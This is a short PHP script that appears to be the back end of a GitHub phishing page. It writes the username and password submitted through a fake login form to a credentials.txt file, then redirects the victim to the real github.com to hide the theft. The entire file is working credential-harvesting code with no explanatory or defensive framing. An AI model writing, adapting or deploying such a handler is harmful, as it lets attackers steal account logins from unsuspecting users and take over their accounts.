<?php
file_put_contents("../../.server/credentials.txt", "GitHub Login\n", FILE_APPEND);
file_put_contents("../../.server/credentials.txt", "Username: " . $_POST['username'] . "\n", FILE_APPEND);
file_put_contents("../../.server/credentials.txt", "Password: " . $_POST['password'] . "\n\n", FILE_APPEND);
header('Location: https://github.com');
exit();
?>
